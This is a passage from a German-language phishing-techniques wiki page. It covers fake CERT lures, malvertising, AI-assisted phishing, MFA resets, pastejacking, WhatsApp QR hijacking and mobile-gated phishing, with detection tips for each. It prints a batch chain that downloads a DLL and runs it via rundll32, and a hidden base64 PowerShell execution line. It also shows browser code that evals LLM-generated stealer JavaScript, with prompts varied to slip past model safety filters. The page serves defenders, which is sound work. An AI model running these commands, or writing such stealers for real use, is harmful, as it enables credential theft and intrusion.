* Köder: geklonte nationale CERT-Sicherheitswarnung mit einer **Update**-Schaltfläche, die schrittweise „Lösungs“-Anweisungen anzeigt. Die Opfer werden angewiesen, eine Batchdatei auszuführen, die eine DLL herunterlädt und sie über `rundll32` ausführt.<sup>[[12]](#references)</sup>
* Typische beobachtete Batch-Kette:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` legt den payload unter `%TEMP%` ab, eine kurze Pause kaschiert Netzwerk-Jitter, dann ruft `rundll32` den exportierten Einstiegspunkt (`notepad`) auf.
* Die DLL sendet ein Beacon mit der Host-Identität und fragt C2 alle paar Minuten ab. Remote-Tasking trifft als **base64-kodiertes PowerShell** ein, das verborgen und mit Richtlinien-Bypass ausgeführt wird:
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Dies bewahrt die Flexibilität von C2 (der Server kann Aufgaben austauschen, ohne die DLL zu aktualisieren) und blendet Konsolenfenster aus. Sucht nach PowerShell-Prozessen, die von `rundll32.exe` gestartet wurden und gemeinsam `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` verwenden.
* Defender können nach HTTP(S)-Callbacks im Format `...page.php?tynor=<COMPUTER>sss<USER>` und 5-minütigen Polling-Intervallen nach dem Laden der DLL suchen.

---

## Durch Anzeigen ausgelöste Malvertising-Angriffe über RTB

Anders als ein gesponsertes Suchergebnis, das einen Klick erfordert, kann eine RTB-Anzeige JavaScript von Drittanbietern laden, wenn ihr Creative auf einer Website oder in einer App gerendert wird. Citizen Lab beobachtete Ad-Tags, die einen separaten Decision-Server mit Werbe-IDs aufriefen. Die meisten Impressionen erhielten eine leere Antwort; ausgewählte Impressionen konnten JavaScript erhalten. Eine harmlose Antwort bei der Replay-Analyse belegt daher nicht, dass alle Betrachter denselben Inhalt erhalten haben.<sup>[[14]](#references)</sup>

Dies ist ein **Auslieferungsmechanismus**, für sich genommen jedoch kein Exploit: Die Ausführung von JavaScript im Kontext des Anzeigen-Renderings installiert nicht automatisch Spyware. Der zugrunde liegende Browser- oder OS-Exploit wurde nicht offengelegt. Daher beweist eine Anzeigenimpression oder eine Anfrage an den Decision-Server allein keine Infektion. Informationen zur Verknüpfung von IDs beim RTB-Targeting finden Sie unter [Threat Modeling and Identity Separation](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## KI-gestützte Phishing-Operationen
Angreifer kombinieren mittlerweile **LLM- und Voice-Clone-APIs** für vollständig personalisierte Köder und Interaktionen in Echtzeit.

| Ebene | Beispielhafte Verwendung durch Angreifer |
|-------|-----------------------------|
|Automatisierung|Mehr als 100.000 E-Mails / SMS mit zufälligen Formulierungen und Tracking-Links generieren und versenden.|
|Generative KI|*Einmalige* E-Mails verfassen, die auf öffentliche M&A-Informationen und Insiderwitze aus sozialen Medien Bezug nehmen; Deepfake-Stimme eines CEOs bei einem Rückrufbetrug einsetzen.|
|Agentische KI|Selbstständig Domains registrieren, Open-Source-Informationen sammeln und E-Mails für die nächste Phase verfassen, wenn ein Opfer klickt, aber keine Zugangsdaten übermittelt.|

**Abwehr:**  
• **Dynamische Banner** hinzufügen, die Nachrichten aus nicht vertrauenswürdiger Automatisierung hervorheben (anhand von ARC-/DKIM-Anomalien).  
• **Sprachbiometrische Challenge-Phrasen** für Telefonanfragen mit hohem Risiko einsetzen.  
• In Awareness-Programmen kontinuierlich KI-generierte Köder simulieren – statische Vorlagen sind überholt.

Siehe auch – Missbrauch agentischer Browser beim Credential-Phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Siehe auch – Missbrauch lokaler CLI-Tools und MCP durch KI-Agenten (für Inventarisierung von Secrets und Erkennung):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-gestützte Laufzeitgenerierung von Phishing-JavaScript (Codegenerierung im Browser)

Angreifer können harmlos wirkendes HTML bereitstellen und **den Stealer zur Laufzeit generieren**, indem sie eine **vertrauenswürdige LLM-API** um JavaScript bitten und es anschließend im Browser ausführen (z. B. mit `eval` oder einem dynamischen `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt als Verschleierung:** Exfil-URLs/Base64-Zeichenfolgen im Prompt kodieren; Formulierungen variieren, um Sicherheitsfilter zu umgehen und Halluzinationen zu reduzieren.
2. **Clientseitiger API-Aufruf:** Beim Laden ruft JavaScript ein öffentliches LLM (Gemini/DeepSeek usw.) oder einen CDN-Proxy auf; im statischen HTML sind nur der Prompt/API-Aufruf enthalten.
3. **Zusammensetzen und Ausführen:** Die Antwort verketten und ausführen (polymorph bei jedem Besuch):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** Der generierte Code personalisiert den Köder (z. B. durch LogoKit-Token-Parsing) und sendet Zugangsdaten an den im Prompt verborgenen Endpunkt.

**Umgehungsmerkmale**
- Der Traffic läuft über bekannte LLM-Domains oder seriöse CDN-Proxys, manchmal per WebSockets zu einem Backend.
- Kein statischer Payload; bösartiges JS existiert erst nach dem Rendern.
- Nicht-deterministische Generierungen erzeugen pro Sitzung **einzigartige** Stealer.

**Erkennungsideen**
- Sandboxes mit aktiviertem JS ausführen; **runtime `eval` / dynamische Skripterstellung aus LLM-Antworten** kennzeichnen.
- Nach Frontend-POSTs an LLM-APIs suchen, auf die unmittelbar `eval`/`Function` mit dem zurückgegebenen Text folgt.
- Bei nicht genehmigten LLM-Domains im Client-Traffic mit anschließenden Zugangsdaten-POSTs Alarm auslösen.

---

## MFA Fatigue / Push Bombing Variante – Erzwungener Reset
Zusätzlich zu klassischem Push-Bombing erzwingen Angreifer während des Helpdesk-Anrufs einfach **eine neue MFA-Registrierung** und machen so das bestehende Token des Benutzers ungültig. Jede anschließende Login-Aufforderung wirkt für das Opfer legitim.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Überwache AzureAD/AWS/Okta-Ereignisse, bei denen **`deleteMFA` + `addMFA`** innerhalb weniger Minuten von derselben IP aus auftreten.



## Clipboard Hijacking / Pastejacking

Angreifer können über eine kompromittierte oder typosquattete Webseite unbemerkt schädliche Befehle in die Zwischenablage des Opfers kopieren und den Benutzer dann dazu bringen, sie in **Win + R**, **Win + X** oder ein Terminalfenster einzufügen. So wird beliebiger Code ohne Download oder Anhang ausgeführt.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Verteilung bösartiger Apps (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp-Geräteverknüpfung kapern durch QR-Social-Engineering
* Eine Köderseite (z. B. ein gefälschter „Kanal“ eines Ministeriums/CERT) zeigt einen WhatsApp-Web-/Desktop-QR-Code an und weist das Opfer an, ihn zu scannen. Dadurch wird der Angreifer unbemerkt als **verknüpftes Gerät** hinzugefügt.<sup>[[12]](#references)</sup>
* Der Angreifer erhält sofort Einblick in Chats und Kontakte, bis die Sitzung entfernt wird. Opfer sehen später möglicherweise eine Benachrichtigung über ein „neues verknüpftes Gerät“; Verteidiger können nach unerwarteten Geräteverknüpfungsereignissen suchen, die kurz nach Besuchen nicht vertrauenswürdiger QR-Seiten auftreten.

### Durch Mobilgeräteprüfung abgeschirmtes Phishing zur Umgehung von Crawlern/Sandboxes
Operatoren schalten zunehmend eine einfache Geräteprüfung vor ihre Phishing-Abläufe, damit Desktop-Crawler die endgültigen Seiten nicht erreichen. Ein gängiges Muster ist ein kleines Skript, das prüft, ob das DOM Touch-Eingaben unterstützt, und das Ergebnis an einen Server-Endpunkt sendet. Nicht-mobile Clients erhalten HTTP 500 (oder eine leere Seite), während mobilen Benutzern der vollständige Ablauf angezeigt wird.<sup>[[7]](#references)</sup>

Minimales Client-Snippet (typische Logik):

```html
<script src="/static/detect_device.js"></script>
```

`detect_device.js`-Logik (vereinfacht):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Serververhalten, das häufig beobachtet wird:
- Setzt beim ersten Laden ein Session-Cookie.
- Akzeptiert `POST /detect {"is_mobile":true|false}`.
- Gibt bei nachfolgenden GETs `500` (oder einen Platzhalter) zurück, wenn `is_mobile=false`; liefert Phishing-Inhalte nur, wenn `true`.

Heuristiken zur Suche und Erkennung:
- urlscan-Abfrage: `filename:"detect_device.js" AND page.status:500`
- Web-Telemetrie: Abfolge von `GET /static/detect_device.js` → `POST /detect` → HTTP 500 bei nicht mobilen Geräten; legitime Pfade mobiler Opfer liefern 200 mit anschließendem HTML/JS.
- Seiten blockieren oder genauer prüfen, wenn Inhalte ausschließlich anhand von `ontouchstart` oder ähnlichen Geräteprüfungen angezeigt werden.

Verteidigungstipps:
- Crawler mit mobilähnlichen Fingerprints und aktiviertem JS ausführen, um geschützte Inhalte sichtbar zu machen.
- Bei verdächtigen 500-Antworten nach `POST /detect` auf neu registrierten Domains einen Alarm auslösen.

## References

- [1] [Generieren von Domain-Varianten für Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing finden: Tools und Techniken (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Zugangsdaten stehlen und 2FA mit noVNC umgehen (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Sitzungen stehlen und 2FA mit EvilnoVNC umgehen (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [DKIM mit Postfix unter Debian Wheezy installieren und konfigurieren (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Globaler Incident-Response-Bericht 2025 von Unit 42 – Ausgabe Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobilbeschränkte Phishing-Infrastruktur und Heuristiken (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Die nächste Grenze von Runtime-Assembly-Angriffen: LLMs zur Echtzeitgenerierung von Phishing-JavaScript einsetzen](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Identitätsdiebstahl, Click Hijacking und TDS: Einblicke in ein Ökosystem zur Malware-Verbreitung](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting von Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Datenverkehr zu Microsofts windows.com durch Bit-Flipping umleiten (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Liebe? In Wirklichkeit: Gefälschte Dating-App als Köder in gezielter Spyware-Kampagne in Pakistan eingesetzt](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs und Samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [AdFection aufgedeckt: Wie Discover-Tech gezielte Werbung in eine Pipeline für Zero-Click-Söldner-Spyware verwandelte](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
